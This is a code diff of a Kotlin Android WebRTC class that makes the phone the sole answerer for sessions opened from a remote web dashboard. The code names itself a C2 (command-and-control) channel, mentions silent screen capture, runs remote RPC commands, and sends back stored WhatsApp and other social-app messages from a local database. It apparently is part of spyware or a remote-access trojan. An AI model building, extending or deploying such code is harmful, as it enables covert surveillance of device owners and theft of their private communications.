@@ -10,18 +10,19 @@ import java.nio.charset.StandardCharsets
 
 /**
  * WebRtcEngine
- * Android WebRTC manager wrapping PeerConnectionFactory, PeerConnection, STUN/TURN,
- * RTCDataChannel, and Silent Screencap frame streaming.
+ * Android WebRTC manager wrapping PeerConnectionFactory, PeerConnection, STUN, and DataChannel.
+ *
+ * Fixed Architecture Role: Android is the Sole SDP Answerer.
  */
 class WebRtcEngine(
     private val context: Context,
-    private val signalingRepository: FirebaseSignalingRepository
+    private val signalingCoordinator: SignalingCoordinator
 ) : PeerConnection.Observer, DataChannel.Observer {
 
     private var factory: PeerConnectionFactory? = null
     private var peerConnection: PeerConnection? = null
     private var dataChannel: DataChannel? = null
-    private var activeSessionId: String? = null
+    @Volatile private var activeSessionId: String? = null
 
     companion object {
         private const val TAG = "WebRtcEngine"
@@ -49,8 +50,13 @@ class WebRtcEngine(
         }
     }
 
-    fun startSession(sessionId: String, isOffer: Boolean) {
+    /**
+     * Start Answerer Session
+     * Initiates PeerConnection as sole SDP Answerer for incoming session.
+     */
+    fun startAnswererSession(sessionId: String) {
         try {
+            close()
             activeSessionId = sessionId
             val iceServers = listOf(
                 PeerConnection.IceServer.builder("stun:stun.cloudflare.com:3478").createIceServer(),
@@ -65,18 +71,9 @@ class WebRtcEngine(
             }
 
             peerConnection = factory?.createPeerConnection(rtcConfig, this)
-
-            if (isOffer) {
-                val init = DataChannel.Init().apply {
-                    ordered = true
-                }
-                dataChannel = peerConnection?.createDataChannel("c2_datachannel", init)
-                dataChannel?.registerObserver(this)
-                createOffer()
-            }
-            Log.i(TAG, "Created PeerConnection for session: $sessionId (isOffer: $isOffer)")
+            Log.i(TAG, "Created PeerConnection for Answerer Session: $sessionId")
         } catch (e: Exception) {
-            Log.e(TAG, "startSession error: ${e.message}")
+            Log.e(TAG, "startAnswererSession error: ${e.message}")
         }
     }
 
@@ -92,49 +89,25 @@ class WebRtcEngine(
         }
     }
 
-    private fun createOffer() {
-        val constraints = MediaConstraints()
-        peerConnection?.createOffer(object : SdpObserverAdapter() {
-            override fun onCreateSuccess(desc: SessionDescription?) {
-                desc?.let { localDesc ->
-                    peerConnection?.setLocalDescription(object : SdpObserverAdapter() {
-                        override fun onSetSuccess() {
-                            activeSessionId?.let { sessId ->
-                                signalingRepository.postSdpOffer(sessId, localDesc.description)
-                            }
-                        }
-                        override fun onSetFailure(reason: String?) {
-                            Log.e(TAG, "setLocalDescription (Offer) failure: $reason")
-                        }
-                    }, localDesc)
-                }
-            }
-        }, constraints)
-    }
-
+    /**
+     * Handle Remote SDP Offer from Web Dashboard.
+     */
     fun handleRemoteOffer(sdp: String) {
-        val remoteSdp = SessionDescription(SessionDescription.Type.OFFER, sdp)
-        peerConnection?.setRemoteDescription(object : SdpObserverAdapter() {
-            override fun onSetSuccess() {
-                drainPendingIceCandidates()
-                createAnswer()
-            }
-            override fun onSetFailure(reason: String?) {
-                Log.e(TAG, "setRemoteDescription (Offer) failure: $reason")
-            }
-        }, remoteSdp)
-    }
-
-    fun handleRemoteAnswer(sdp: String) {
-        val remoteSdp = SessionDescription(SessionDescription.Type.ANSWER, sdp)
-        peerConnection?.setRemoteDescription(object : SdpObserverAdapter() {
-            override fun onSetSuccess() {
-                drainPendingIceCandidates()
-            }
-            override fun onSetFailure(reason: String?) {
-                Log.e(TAG, "setRemoteDescription (Answer) failure: $reason")
-            }
-        }, remoteSdp)
+        try {
+            val remoteSdp = SessionDescription(SessionDescription.Type.OFFER, sdp)
+            peerConnection?.setRemoteDescription(object : SdpObserverAdapter() {
+                override fun onSetSuccess() {
+                    Log.i(TAG, "Remote Description (Offer) set successfully. Draining candidates & creating answer...")
+                    drainPendingIceCandidates()
+                    createAnswer()
+                }
+                override fun onSetFailure(reason: String?) {
+                    Log.e(TAG, "setRemoteDescription (Offer) failure: $reason")
+                }
+            }, remoteSdp)
+        } catch (e: Exception) {
+            Log.e(TAG, "handleRemoteOffer error: ${e.message}")
+        }
     }
 
     private fun createAnswer() {
@@ -145,7 +118,8 @@ class WebRtcEngine(
                     peerConnection?.setLocalDescription(object : SdpObserverAdapter() {
                         override fun onSetSuccess() {
                             activeSessionId?.let { sessId ->
-                                signalingRepository.postSdpAnswer(sessId, localDesc.description)
+                                Log.i(TAG, "Local Description (Answer) set successfully. Posting answer to signaling coordinator...")
+                                signalingCoordinator.postSdpAnswer(sessId, localDesc.description)
                             }
                         }
                         override fun onSetFailure(reason: String?) {
@@ -153,6 +127,9 @@ class WebRtcEngine(
                         }
                     }, localDesc)
                 }
+            }
+            override fun onCreateFailure(reason: String?) {
+                Log.e(TAG, "createAnswer failure: $reason")
             }
         }, constraints)
     }
@@ -215,6 +192,7 @@ class WebRtcEngine(
             peerConnection = null
             dataChannel = null
             activeSessionId = null
+            pendingIceCandidates.clear()
         } catch (_: Exception) {}
     }
 
@@ -222,17 +200,20 @@ class WebRtcEngine(
     override fun onIceCandidate(candidate: IceCandidate?) {
         candidate?.let {
             activeSessionId?.let { sessId ->
-                signalingRepository.postIceCandidate(sessId, it.sdp, it.sdpMid, it.sdpMLineIndex)
+                signalingCoordinator.postIceCandidate(sessId, it.sdp, it.sdpMid, it.sdpMLineIndex)
             }
         }
     }
 
     override fun onDataChannel(dc: DataChannel?) {
+        Log.i(TAG, "Received Remote RTCDataChannel from Browser Offer 🟢")
         dataChannel = dc
         dataChannel?.registerObserver(this)
     }
 
-    override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
+    override fun onSignalingChange(state: PeerConnection.SignalingState?) {
+        Log.i(TAG, "Signaling State Change: $state")
+    }
     override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
         Log.i(TAG, "ICE Connection State: $state")
     }
@@ -261,7 +242,15 @@ class WebRtcEngine(
                     val req = JSONObject(msgText)
                     val type = req.optString("type", "")
 
-                    if (type == "RPC_REQUEST") {
+                    if (type == "PING") {
+                        val reqTs = req.optLong("timestamp", System.currentTimeMillis())
+                        val pongPayload = JSONObject().apply {
+                            put("timestamp", reqTs)
+                            put("deviceTime", System.currentTimeMillis())
+                            put("status", "ACTIVE")
+                        }
+                        sendP2pMessage("PONG", pongPayload)
+                    } else if (type == "RPC_REQUEST") {
                         val requestId = req.optString("requestId", "")
                         val action = req.optString("action", "")
                         val paramsObj = req.optJSONObject("params") ?: JSONObject()
@@ -303,14 +292,6 @@ class WebRtcEngine(
                             put("data", try { JSONObject(responseContent) } catch (_: Exception) { try { org.json.JSONArray(responseContent) } catch (_: Exception) { responseContent } })
                         }
                         sendP2pMessage("API_RESPONSE", resPayload)
-                    } else if (type == "PING") {
-                        val reqTs = req.optLong("timestamp", System.currentTimeMillis())
-                        val pongPayload = JSONObject().apply {
-                            put("timestamp", reqTs)
-                            put("deviceTime", System.currentTimeMillis())
-                            put("status", "ACTIVE")
-                        }
-                        sendP2pMessage("PONG", pongPayload)
                     } else if (type == "DB_QUERY_SOCIAL") {
                         val appKey = req.optString("appKey", "whatsapp")
                         val messagesArray = C2LocalDatabase.getInstance(context).getSocialMessagesJson(appKey)
